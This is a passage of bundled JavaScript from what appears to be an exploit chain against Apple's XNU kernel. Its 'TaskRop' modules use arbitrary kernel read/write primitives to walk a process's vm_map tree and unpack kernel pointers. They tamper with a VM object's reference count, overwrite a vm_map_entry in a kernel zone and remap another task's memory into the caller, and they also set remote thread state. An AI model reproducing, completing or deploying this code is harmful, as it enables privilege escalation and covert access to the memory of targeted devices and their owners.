      //console.log(TAG,`thread:${Utils.hex(thread)}`);
      var kr = _Chain_Native__WEBPACK_IMPORTED_MODULE_2__["default"].callSymbol("thread_set_state", machThread, _JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].ARM_THREAD_STATE64, statePtr, _JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].ARM_THREAD_STATE64_COUNT);
      if (kr != 0) {
        console.log(TAG, "Failed thread_set_state with error:".concat(kr));
        return false;
      }
      if (threadAddr) {
        options &= ~0x8000;
        Thread.setOptions(threadAddr, options);
      }
      return true;
    }
  }, {
    key: "resume",
    value: function resume(machThread) {
      var kr = _Chain_Native__WEBPACK_IMPORTED_MODULE_2__["default"].callSymbol("thread_resume", machThread);
      if (kr != 0) {
        console.log(TAG, "Unable to resume suspended thread");
        return false;
      }
      return true;
    }
  }]);
}();


/***/ }),

/***/ "./libs/TaskRop/ThreadState.js":
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "default", function() { return ThreadState; });
/* harmony import */ var _RegistersStruct__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__("./libs/TaskRop/RegistersStruct.js");
function _typeof(o) { "@babel/helpers - typeof"; return _typeof = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function (o) { return typeof o; } : function (o) { return o && "function" == typeof Symbol && o.constructor === Symbol && o !== Symbol.prototype ? "symbol" : typeof o; }, _typeof(o); }
function _classCallCheck(a, n) { if (!(a instanceof n)) throw new TypeError("Cannot call a class as a function"); }
function _defineProperties(e, r) { for (var t = 0; t < r.length; t++) { var o = r[t]; o.enumerable = o.enumerable || !1, o.configurable = !0, "value" in o && (o.writable = !0), Object.defineProperty(e, _toPropertyKey(o.key), o); } }
function _createClass(e, r, t) { return r && _defineProperties(e.prototype, r), t && _defineProperties(e, t), Object.defineProperty(e, "prototype", { writable: !1 }), e; }
function _toPropertyKey(t) { var i = _toPrimitive(t, "string"); return "symbol" == _typeof(i) ? i : i + ""; }
function _toPrimitive(t, r) { if ("object" != _typeof(t) || !t) return t; var e = t[Symbol.toPrimitive]; if (void 0 !== e) { var i = e.call(t, r || "default"); if ("object" != _typeof(i)) return i; throw new TypeError("@@toPrimitive must return a primitive value."); } return ("string" === r ? String : Number)(t); }
function _classPrivateFieldInitSpec(e, t, a) { _checkPrivateRedeclaration(e, t), t.set(e, a); }
function _checkPrivateRedeclaration(e, t) { if (t.has(e)) throw new TypeError("Cannot initialize the same private elements twice on an object"); }
function _classPrivateFieldGet(s, a) { return s.get(_assertClassBrand(s, a)); }
function _classPrivateFieldSet(s, a, r) { return s.set(_assertClassBrand(s, a), r), r; }
function _assertClassBrand(e, t, n) { if ("function" == typeof e ? e === t : e.has(t)) return arguments.length < 3 ? t : n; throw new TypeError("Private element is not present on this object"); }

var _buffer = /*#__PURE__*/new WeakMap();
var _dataView = /*#__PURE__*/new WeakMap();
var ThreadState = /*#__PURE__*/function () {
  function ThreadState(buffer) {
    var offset = arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : 0;
    _classCallCheck(this, ThreadState);
    _classPrivateFieldInitSpec(this, _buffer, void 0);
    _classPrivateFieldInitSpec(this, _dataView, void 0);
    _classPrivateFieldSet(_buffer, this, buffer);
    _classPrivateFieldSet(_dataView, this, new DataView(buffer, offset));
    this.registers = new _RegistersStruct__WEBPACK_IMPORTED_MODULE_0__["default"](buffer, offset);
  }
  return _createClass(ThreadState, [{
    key: "buffer",
    get: function get() {
      return _classPrivateFieldGet(_buffer, this);
    }
  }, {
    key: "opaque_fp",
    get: function get() {
      return _classPrivateFieldGet(_dataView, this).getBigUint64(232, true);
    },
    set: function set(value) {
      _classPrivateFieldGet(_dataView, this).setBigUint64(232, value, true);
    }
  }, {
    key: "opaque_lr",
    get: function get() {
      return _classPrivateFieldGet(_dataView, this).getBigUint64(240, true);
    },
    set: function set(value) {
      _classPrivateFieldGet(_dataView, this).setBigUint64(240, value, true);
    }
  }, {
    key: "opaque_sp",
    get: function get() {
      return _classPrivateFieldGet(_dataView, this).getBigUint64(248, true);
    },
    set: function set(value) {
      _classPrivateFieldGet(_dataView, this).setBigUint64(248, value, true);
    }
  }, {
    key: "opaque_pc",
    get: function get() {
      return _classPrivateFieldGet(_dataView, this).getBigUint64(256, true);
    },
    set: function set(value) {
      _classPrivateFieldGet(_dataView, this).setBigUint64(256, value, true);
    }
  }, {
    key: "cpsr",
    get: function get() {
      return _classPrivateFieldGet(_dataView, this).getUint32(264, true);
    },
    set: function set(value) {
      _classPrivateFieldGet(_dataView, this).setUint32(264, value, true);
    }
  }, {
    key: "opaque_flags",
    get: function get() {
      return _classPrivateFieldGet(_dataView, this).getUint32(268, true);
    },
    set: function set(value) {
      _classPrivateFieldGet(_dataView, this).setUint32(268, value, true);
    }
  }]);
}();


/***/ }),

/***/ "./libs/TaskRop/VM.js":
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "default", function() { return VM; });
/* harmony import */ var libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__("./libs/Chain/Chain.js");
/* harmony import */ var libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__("./libs/Chain/Native.js");
/* harmony import */ var libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__("./libs/JSUtils/Utils.js");
/* harmony import */ var _VmMapEntry__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__("./libs/TaskRop/VmMapEntry.js");
/* harmony import */ var _Task__WEBPACK_IMPORTED_MODULE_4__ = __webpack_require__("./libs/TaskRop/Task.js");
/* harmony import */ var _VMObject__WEBPACK_IMPORTED_MODULE_5__ = __webpack_require__("./libs/TaskRop/VMObject.js");
/* harmony import */ var _VMShmem__WEBPACK_IMPORTED_MODULE_6__ = __webpack_require__("./libs/TaskRop/VMShmem.js");
/* harmony import */ var _VmPackingParams__WEBPACK_IMPORTED_MODULE_7__ = __webpack_require__("./libs/TaskRop/VmPackingParams.js");
function _typeof(o) { "@babel/helpers - typeof"; return _typeof = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function (o) { return typeof o; } : function (o) { return o && "function" == typeof Symbol && o.constructor === Symbol && o !== Symbol.prototype ? "symbol" : typeof o; }, _typeof(o); }
var _VM;
function _classCallCheck(a, n) { if (!(a instanceof n)) throw new TypeError("Cannot call a class as a function"); }
function _defineProperties(e, r) { for (var t = 0; t < r.length; t++) { var o = r[t]; o.enumerable = o.enumerable || !1, o.configurable = !0, "value" in o && (o.writable = !0), Object.defineProperty(e, _toPropertyKey(o.key), o); } }
function _createClass(e, r, t) { return r && _defineProperties(e.prototype, r), t && _defineProperties(e, t), Object.defineProperty(e, "prototype", { writable: !1 }), e; }
function _defineProperty(e, r, t) { return (r = _toPropertyKey(r)) in e ? Object.defineProperty(e, r, { value: t, enumerable: !0, configurable: !0, writable: !0 }) : e[r] = t, e; }
function _toPropertyKey(t) { var i = _toPrimitive(t, "string"); return "symbol" == _typeof(i) ? i : i + ""; }
function _toPrimitive(t, r) { if ("object" != _typeof(t) || !t) return t; var e = t[Symbol.toPrimitive]; if (void 0 !== e) { var i = e.call(t, r || "default"); if ("object" != _typeof(i)) return i; throw new TypeError("@@toPrimitive must return a primitive value."); } return ("string" === r ? String : Number)(t); }
function _assertClassBrand(e, t, n) { if ("function" == typeof e ? e === t : e.has(t)) return arguments.length < 3 ? t : n; throw new TypeError("Private element is not present on this object"); }








var TAG = "VM";
var VME_ALIAS_BITS = 12n;
var VME_OFFSET_BITS = 64n - VME_ALIAS_BITS;
var VME_OFFSET_SHIFT = VME_ALIAS_BITS;
var VME_SUBMAP_SHIFT = 2n;
var VME_SUBMAP_BITS = 8n * 8n - VME_SUBMAP_SHIFT;
var VM_KERNEL_POINTER_SIGNIFICANT_BITS = 38;
var VM_MAX_KERNEL_ADDRESS = 0xfffffffbffffffffn;
var VM_PAGE_PACKED_PTR_BITS = 31;
var VM_PAGE_PACKED_PTR_SHIFT = 6;
var SIZE_VMOBJECT = 0x20;
var VM_LINK_SIZE = 0x20;
var VM_MAP_ENTRY_SIZE = 0x50;
var VMShmem_SIZE = 0x18;
var VMPackingSize = 0x10;
var VM_FLAGS_ANYWHERE = 0x00000001n;
var VM = /*#__PURE__*/function () {
  function VM() {
    _classCallCheck(this, VM);
  }
  return _createClass(VM, null, [{
    key: "mapRemotePage",
    value: function mapRemotePage(vmMap, address) {
      //console.log(TAG, `Map remote address: ${Utils.hex(address)}`);

      var vmObject = VM.getObject(vmMap, address);
      //LOG("vmObject: %llx (objectOffset=%llx, entryOffset=%llx)",
      //	vmObject.address,
      //	vmObject.objectOffset,
      //	vmObject.entryOffset);

      if (!vmObject.address) return null;
      var shmem = VM.createShmemWithVmObject(vmObject);
      //LOG("shmem: port=%x, address=%llx", shmem.port, shmem.remoteAddress);

      return shmem;
    }
  }, {
    key: "getObject",
    value: function getObject(map, address) {
      var VMObjectBuff = new ArrayBuffer(SIZE_VMOBJECT);
      var vmObject = new _VMObject__WEBPACK_IMPORTED_MODULE_5__["default"](VMObjectBuff);
      var entryAddr = _assertClassBrand(VM, this, _vm_getEntry).call(this, map, address);
      if (!entryAddr) return vmObject;
      var entryBuff = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].readBuff(entryAddr, VM_MAP_ENTRY_SIZE);
      var entryUintArr = new Uint8Array(entryBuff);
      var entry = new _VmMapEntry__WEBPACK_IMPORTED_MODULE_3__["vm_map_entry"](entryUintArr);
      //console.log(TAG, `entry: addr=${Utils.hex(entryAddr)}, is_sub_map=${entry.is_sub_map}, vme_object_packed=${Utils.hex(entry.vme_object)}`);

      var paramsBuff = new ArrayBuffer(VMPackingSize);
      var params = new _VmPackingParams__WEBPACK_IMPORTED_MODULE_7__["default"](paramsBuff);
      params.vmpp_base = _assertClassBrand(VM, this, _VM_PAGE_PACKED_PTR_BASE).call(this);
      params.vmpp_bits = VM_PAGE_PACKED_PTR_BITS;
      params.vmpp_shift = VM_PAGE_PACKED_PTR_SHIFT;
      params.vmpp_base_relative = _assertClassBrand(VM, this, _VM_PACKING_IS_BASE_RELATIVE).call(this, params);
      var vmeObject = _assertClassBrand(VM, this, _VM_UNPACK_POINTER).call(this, entry.vme_object, params);
      //console.log(TAG, `vme object: ${Utils.hex(vmeObject)}`);

      var objectOffs = _assertClassBrand(VM, this, _VME_OFFSET).call(this, entry);
      var entryOffs = address - entry.links.start + objectOffs;

      //console.log(TAG, `object offset: ${Utils.hex(objectOffs)}`);
      //console.log(TAG, `entry offset: ${Utils.hex(entryOffs)}`);

      vmObject.vmAddress = address;
      vmObject.address = BigInt(vmeObject);
      vmObject.objectOffset = BigInt(objectOffs);
      vmObject.entryOffset = BigInt(entryOffs);
      return vmObject;
    }
  }, {
    key: "createShmemWithVmObject",
    value: function createShmemWithVmObject(object) {
      //console.log(TAG,`Inside createShmem with addr to read:${Utils.hex(object.address)}`);
      var shmemBuff = new ArrayBuffer(VMShmem_SIZE);
      var shmem = new _VMShmem__WEBPACK_IMPORTED_MODULE_6__["default"](shmemBuff);
      var size = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].read64(object.address + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().vouSize);
      size = _Task__WEBPACK_IMPORTED_MODULE_4__["default"].round_page(size);

      //console.log(TAG,`vm object size:${Utils.hex(size)}`);

      var localAddr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem;
      var roundedSize = _assertClassBrand(VM, this, _round_page_kernel).call(this, size);
      var ret = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("mach_vm_allocate", 0x203n, localAddr, roundedSize, VM_FLAGS_ANYWHERE);
      if (ret != 0) {
        console.log(TAG, "mach_vm_allocate():".concat(ret));
        return shmem;
      }
      localAddr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].read64(localAddr);
      //console.log(TAG,`mach_vm_allocate:${Utils.hex(roundedSize)} localAddr:${Utils.hex(localAddr)}`);
      /*
      let memory_object = new_bigint();
      ret = Native.callSymbol("mach_make_memory_entry_64",
      	0x203n,
      	get_bigint_addr(roundedSize),
      	localAddr,
      	this.VM_PROT_READ | this.VM_PROT_WRITE,
      	get_bigint_addr(memory_object),
      	0n);
      let resBuff = Native.read(get_bigint_addr(memory_object),Utils.UINT32_SIZE);
      let resView = new DataView(resBuff);
      let port = resView.getUint32(0,true);
      */

      var memory_object = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem + 0x500n;
      var roundedSizePtr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem + 0x1000n;
      libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].write64(roundedSizePtr, roundedSize);
      ret = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("mach_make_memory_entry_64", 0x203n, roundedSizePtr, localAddr, this.VM_PROT_READ | this.VM_PROT_WRITE, memory_object, 0n);
      var port = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].read32(memory_object);
      //let port = Native.callSymbol("wrapper_mach_make_memory_entry_64",roundedSize,localAddr);
      //console.log(TAG,`mach_make_memory_entry_64():${Utils.hex(port)}`);
      var shmemNamedEntry = _Task__WEBPACK_IMPORTED_MODULE_4__["default"].getPortKObject(BigInt(port));
      //console.log(TAG,`shmem named entry:${Utils.hex(shmemNamedEntry)}`);
      var shmemVMCopyAddr = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].read64(shmemNamedEntry + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().backingCopy);
      //console.log(TAG,`shmem named entry VM copy addr:${Utils.hex(shmemVMCopyAddr)}`);
      var nextAddr = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].read64(shmemVMCopyAddr + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().next);
      //console.log(TAG,`next addr:${Utils.hex(nextAddr)}`);
      var entryBuff = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].readBuff(nextAddr, VM_MAP_ENTRY_SIZE);
      var entryArr = new Uint8Array(entryBuff);
      var entry = new _VmMapEntry__WEBPACK_IMPORTED_MODULE_3__["vm_map_entry"](entryArr);
      //console.log(TAG,`entry: vme_kernel_object=${Utils.hex(entry.vme_kernel_object)}, is_sub_map=${Utils.hex(entry.is_sub_map)}`);
      //console.log(TAG,`entry: is_sub_map=${Utils.hex(entry.is_sub_map)}`);
      if (entry.vme_kernel_object || entry.is_sub_map || false)
        // vme_kernel_object struct is not implemented
        {
          console.log(TAG, "Entry cannot be a submap");
          return shmem;
        }
      var paramsBuff = new ArrayBuffer(VMPackingSize);
      var params = new _VmPackingParams__WEBPACK_IMPORTED_MODULE_7__["default"](paramsBuff);
      params.vmpp_base = _assertClassBrand(VM, this, _VM_PAGE_PACKED_PTR_BASE).call(this);
      params.vmpp_bits = VM_PAGE_PACKED_PTR_BITS;
      params.vmpp_shift = VM_PAGE_PACKED_PTR_SHIFT;
      params.vmpp_base_relative = _assertClassBrand(VM, this, _VM_PACKING_IS_BASE_RELATIVE).call(this, params);
      var packedPointer = _assertClassBrand(VM, this, _VM_PACK_POINTER).call(this, object.address, params);
      //console.log(TAG,`packedPointer:${Utils.hex(packedPointer)}`);
      var refCount = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].read32(object.address + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().refCount);
      //console.log(TAG,`vm object ref count:${Utils.hex(refCount)}`);
      refCount++;
      libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].write32(object.address + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().refCount, refCount);
      entry.vme_object = Number(packedPointer);
      entry.vme_offset = object.objectOffset;
      //write(nextAddr, &entry, sizeof(entry));
      // write dedicate write in order to avoid zone panic with bigger 0x20 elements size
      var entryResWrite = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem;
      libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].write(entryResWrite, entryArr.buffer);
      //Utils.printArrayBufferInChunks(entryArr.buffer);
      libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].writeZoneElement(nextAddr, entryResWrite, VM_MAP_ENTRY_SIZE);
      //console.log(TAG,`After write zone element`);
      //let mappedAddr = Native.callSymbol("malloc",roundedSize * 4n);
      //let mappedAddr = new_bigint();
      var mappedAddr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem;
      libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].write64(mappedAddr, 0x1337n);
      //let mach_vm_map_func = Native.dlsym("mach_vm_map");
      //console.log(TAG,`mach_vm_map:${Utils.hex(mach_vm_map_func)} with object.entryOffset:${Utils.hex(object.entryOffset)}`);
      //ret = fcall(mach_vm_map_func,0x203n,get_bigint_addr(mappedAddr),0x4000n,0n,1n,BigInt(port),BigInt(object.entryOffset),0n,(this.VM_PROT_ALL | this.VM_PROT_IS_MASK) | ((this.VM_PROT_ALL | this.VM_PROT_IS_MASK) << 32n),this.VM_INHERIT_NONE);
      ret = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("mach_vm_map", 0x203n, mappedAddr, 0x4000n, 0n, 1n, BigInt(port), BigInt(object.entryOffset), 0n, this.VM_PROT_ALL | this.VM_PROT_IS_MASK | (this.VM_PROT_ALL | this.VM_PROT_IS_MASK) << 32n, this.VM_INHERIT_NONE);
      //console.log(TAG,`ret:${ret}`);
      mappedAddr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].read64(mappedAddr);
      //console.log(TAG,`mach_vm_map():${Utils.hex(ret)}, mappedAddr=${Utils.hex(mappedAddr)}`);
      if (ret != 0) {
        console.log(TAG, 'failed on mach_vm_map');
        mappedAddr = 0n;
      }
      ret = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("mach_vm_deallocate", 0x203, localAddr, roundedSize);
      if (ret != 0) {
        console.log(TAG, "mach_vm_deallocate: " + ret);
      }

      //let mappedAddr = Native.callSymbol("wrapper_mach_vm_map",port,object.entryOffset);
      //console.log(TAG,`mappedAddr:${Utils.hex(mappedAddr)}`);
      shmem.port = BigInt(port);
      shmem.remoteAddress = object.vmAddress;
      shmem.localAddress = mappedAddr;
      return shmem;
    }
  }, {
    key: "mocker",
    value: function mocker(addrUnpack, addrPack) {
      var paramsBuff = new ArrayBuffer(VMPackingSize);
      var params = new _VmPackingParams__WEBPACK_IMPORTED_MODULE_7__["default"](paramsBuff);
      params.vmpp_base = _assertClassBrand(VM, this, _VM_PAGE_PACKED_PTR_BASE).call(this);
      params.vmpp_bits = VM_PAGE_PACKED_PTR_BITS;
      params.vmpp_shift = VM_PAGE_PACKED_PTR_SHIFT;
      params.vmpp_base_relative = _assertClassBrand(VM, this, _VM_PACKING_IS_BASE_RELATIVE).call(this, params);
      var vmeObject = _assertClassBrand(VM, this, _VM_UNPACK_POINTER).call(this, addrUnpack, params);
      //console.log(TAG,`vmeObjectUnpack:${Utils.hex(vmeObject)}`);
      vmeObject = _assertClassBrand(VM, this, _VM_PACK_POINTER).call(this, addrPack, params);
      //console.log(TAG,`vmeObjectpack:${Utils.hex(vmeObject)}`);
    }
  }]);
}();
_VM = VM;
function _Tib(x) {
  return 0n + x << 40n;
}
function _Gib(x) {
  return 0n + x << 30n;
}
function _VM_MIN_KERNEL_ADDRESS() {
  return 0n - _assertClassBrand(_VM, this, _Gib).call(this, 144n);
}
function _VM_MIN_KERNEL_AND_KEXT_ADDRESS() {
  return _assertClassBrand(_VM, this, _VM_MIN_KERNEL_ADDRESS).call(this);
}
function _VM_PAGE_PACKED_PTR_BASE() {
  return _assertClassBrand(_VM, this, _VM_MIN_KERNEL_AND_KEXT_ADDRESS).call(this);
}
function _VM_PACKING_IS_BASE_RELATIVE(packed) {
  return packed.vmpp_bits + packed.vmpp_shift <= VM_KERNEL_POINTER_SIGNIFICANT_BITS;
}
function _VM_PACKING_PARAMS(ns) {
  ns.vmpp_base_relative = _assertClassBrand(_VM, this, _VM_PACKING_IS_BASE_RELATIVE).call(this, ns);
  return ns;
}
function _VM_UNPACK_POINTER(packed, ns) {
  return _assertClassBrand(_VM, this, _vm_unpack_pointer).call(this, packed, _assertClassBrand(_VM, this, _VM_PACKING_PARAMS).call(this, ns));
}
function _VM_PACK_POINTER(ptr, ns) {
  return _assertClassBrand(_VM, this, _vm_pack_pointer).call(this, ptr, _assertClassBrand(_VM, this, _VM_PACKING_PARAMS).call(this, ns));
}
function _bigUint64ToIntptr(bigUint64) {
  // Create a BigInt mask for the lower 64 bits
  var lower64BitsMask = BigInt("0xFFFFFFFFFFFFFFFF");

  // Apply the mask to ensure the value is within the range of 64 bits
  bigUint64 = bigUint64 & lower64BitsMask;

  // Check if the value is greater than the maximum signed 64-bit integer
  if (bigUint64 > BigInt("0x7FFFFFFFFFFFFFFF")) {
    // Convert to signed by subtracting 2^64
    return Number(bigUint64 - BigInt("0x10000000000000000"));
  } else {
    // Directly convert to Number
    return Number(bigUint64);
  }
}
function _vm_unpack_pointer(packed, params) {
  if (!params.vmpp_base_relative) {
    //console.log(TAG,`In first if unpack`);
    //let addr = this.#bigUint64ToIntptr(BigInt(packed));
    var addr = packed;
    addr <<= 64 - params.vmpp_bits;
    addr >>= 64 - params.vmpp_bits - params.vmpp_shift;
    return addr;
  }
  if (packed) {
    //console.log(TAG,`In second if unpack`);
    return (BigInt(packed) << BigInt(params.vmpp_shift)) + BigInt(params.vmpp_base);
  }
  return 0n;
}
function _vm_pack_pointer(ptr, params) {
  if (!params.vmpp_base_relative) {
    //console.log(TAG,`In first if pack`);
    return ptr >> params.vmpp_shift;
  }
  if (ptr) {
    //console.log(TAG,`In second if pack`);
    return BigInt(ptr) - BigInt(params.vmpp_base) >> BigInt(params.vmpp_shift);
  }
  return 0n;
}
function _VME_OFFSET(entry) {
  return entry.vme_offset << 12n;
}
function _trunc_page_kernel(x) {
  //return ((x) & (~vm_kernel_page_mask));
  return x & ~libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_2__["default"].PAGE_MASK;
}
function _round_page_kernel(x) {
  //return this.#trunc_page_kernel((x) + vm_kernel_page_mask);
  return _assertClassBrand(_VM, this, _trunc_page_kernel).call(this, x + libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_2__["default"].PAGE_MASK);
}
function _vm_getEntry(map, address) {
  var rbhRoot = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].read64(map + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().hdrRBHRoot);

  //console.log(TAG,`Get entry:${Utils.hex(address)}`);
  //console.log(TAG,`rbh root:${Utils.hex(rbhRoot)}`);

  var rbEntry = rbhRoot;
  var foundEntry = 0n;
  while (rbEntry != 0n) {
    var curPtr = rbEntry - 0x20n; // container_of(rb_entry, struct vm_map_entry, store)
    //uint64_t prev = 0;

    var links = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem;
    libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].read(curPtr, links, VM_LINK_SIZE);
    var linksBuffer = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].read(links, VM_LINK_SIZE);
    var linksArray = new Uint8Array(linksBuffer);
    links = new _VmMapEntry__WEBPACK_IMPORTED_MODULE_3__["vm_map_links"](linksArray);

    //console.log(TAG,`[${Utils.hex(links.start)} - ${Utils.hex(links.end)}]:${Utils.hex(curPtr)}`);

    if (address >= links.start) {
      if (address < links.end) {
        foundEntry = curPtr;
        //console.log(TAG,`Found:${Utils.hex(curPtr)}`);
        break;
      }
      var rbeRight = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].read64(rbEntry + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().rbeRight);
      rbEntry = rbeRight;
      //prev = curPtr;
    } else {
      var rbeLeft = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].read64(rbEntry + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().rbeLeft);
      rbEntry = rbeLeft;
    }
  }
  return foundEntry;
}
_defineProperty(VM, "VM_PROT_READ", 1n);
_defineProperty(VM, "VM_PROT_WRITE", 2n);
_defineProperty(VM, "VM_PROT_EXECUTE", 4n);
_defineProperty(VM, "VM_PROT_ALL", _VM.VM_PROT_READ | _VM.VM_PROT_WRITE | _VM.VM_PROT_EXECUTE);
_defineProperty(VM, "VM_PROT_IS_MASK", 0x40n);
_defineProperty(VM, "VM_INHERIT_NONE", 2n);


/***/ }),

/***/ "./libs/TaskRop/VMObject.js":
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "default", function() { return VMObject; });
function _typeof(o) { "@babel/helpers - typeof"; return _typeof = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function (o) { return typeof o; } : function (o) { return o && "function" == typeof Symbol && o.constructor === Symbol && o !== Symbol.prototype ? "symbol" : typeof o; }, _typeof(o); }
function _classCallCheck(a, n) { if (!(a instanceof n)) throw new TypeError("Cannot call a class as a function"); }
function _defineProperties(e, r) { for (var t = 0; t < r.length; t++) { var o = r[t]; o.enumerable = o.enumerable || !1, o.configurable = !0, "value" in o && (o.writable = !0), Object.defineProperty(e, _toPropertyKey(o.key), o); } }
function _createClass(e, r, t) { return r && _defineProperties(e.prototype, r), t && _defineProperties(e, t), Object.defineProperty(e, "prototype", { writable: !1 }), e; }
function _toPropertyKey(t) { var i = _toPrimitive(t, "string"); return "symbol" == _typeof(i) ? i : i + ""; }
function _toPrimitive(t, r) { if ("object" != _typeof(t) || !t) return t; var e = t[Symbol.toPrimitive]; if (void 0 !== e) { var i = e.call(t, r || "default"); if ("object" != _typeof(i)) return i; throw new TypeError("@@toPrimitive must return a primitive value."); } return ("string" === r ? String : Number)(t); }
function _classPrivateFieldInitSpec(e, t, a) { _checkPrivateRedeclaration(e, t), t.set(e, a); }
function _checkPrivateRedeclaration(e, t) { if (t.has(e)) throw new TypeError("Cannot initialize the same private elements twice on an object"); }
function _classPrivateFieldGet(s, a) { return s.get(_assertClassBrand(s, a)); }
function _classPrivateFieldSet(s, a, r) { return s.set(_assertClassBrand(s, a), r), r; }
function _assertClassBrand(e, t, n) { if ("function" == typeof e ? e === t : e.has(t)) return arguments.length < 3 ? t : n; throw new TypeError("Private element is not present on this object"); }
var _buffer = /*#__PURE__*/new WeakMap();
var _dataView = /*#__PURE__*/new WeakMap();
var VMObject = /*#__PURE__*/function () {
  function VMObject(buffer) {
    _classCallCheck(this, VMObject);
    _classPrivateFieldInitSpec(this, _buffer, void 0);
    _classPrivateFieldInitSpec(this, _dataView, void 0);
    _classPrivateFieldSet(_buffer, this, buffer);
    _classPrivateFieldSet(_dataView, this, new DataView(_classPrivateFieldGet(_buffer, this)));
  }
  return _createClass(VMObject, [{
    key: "vmAddress",
    get: function get() {
      return _classPrivateFieldGet(_dataView, this).getBigUint64(0, true);
    },
    set: function set(value) {
      _classPrivateFieldGet(_dataView, this).setBigUint64(0, value, true);
    }
  }, {
    key: "address",
    get: function get() {
      return _classPrivateFieldGet(_dataView, this).getBigUint64(8, true);
    },
    set: function set(value) {
      _classPrivateFieldGet(_dataView, this).setBigUint64(8, value, true);
    }
  }, {
    key: "objectOffset",
    get: function get() {
      return _classPrivateFieldGet(_dataView, this).getBigUint64(16, true);
    },
    set: function set(value) {
      _classPrivateFieldGet(_dataView, this).setBigUint64(16, value, true);
    }
  }, {
    key: "entryOffset",
    get: function get() {
      return _classPrivateFieldGet(_dataView, this).getBigUint64(24, true);
    },
    set: function set(value) {
      _classPrivateFieldGet(_dataView, this).setBigUint64(24, value, true);
    }
  }]);
}();


/***/ }),

/***/ "./libs/TaskRop/VMShmem.js":
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "default", function() { return VMShmem; });
function _typeof(o) { "@babel/helpers - typeof"; return _typeof = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function (o) { return typeof o; } : function (o) { return o && "function" == typeof Symbol && o.constructor === Symbol && o !== Symbol.prototype ? "symbol" : typeof o; }, _typeof(o); }
function _classCallCheck(a, n) { if (!(a instanceof n)) throw new TypeError("Cannot call a class as a function"); }
function _defineProperties(e, r) { for (var t = 0; t < r.length; t++) { var o = r[t]; o.enumerable = o.enumerable || !1, o.configurable = !0, "value" in o && (o.writable = !0), Object.defineProperty(e, _toPropertyKey(o.key), o); } }
function _createClass(e, r, t) { return r && _defineProperties(e.prototype, r), t && _defineProperties(e, t), Object.defineProperty(e, "prototype", { writable: !1 }), e; }
function _toPropertyKey(t) { var i = _toPrimitive(t, "string"); return "symbol" == _typeof(i) ? i : i + ""; }
function _toPrimitive(t, r) { if ("object" != _typeof(t) || !t) return t; var e = t[Symbol.toPrimitive]; if (void 0 !== e) { var i = e.call(t, r || "default"); if ("object" != _typeof(i)) return i; throw new TypeError("@@toPrimitive must return a primitive value."); } return ("string" === r ? String : Number)(t); }
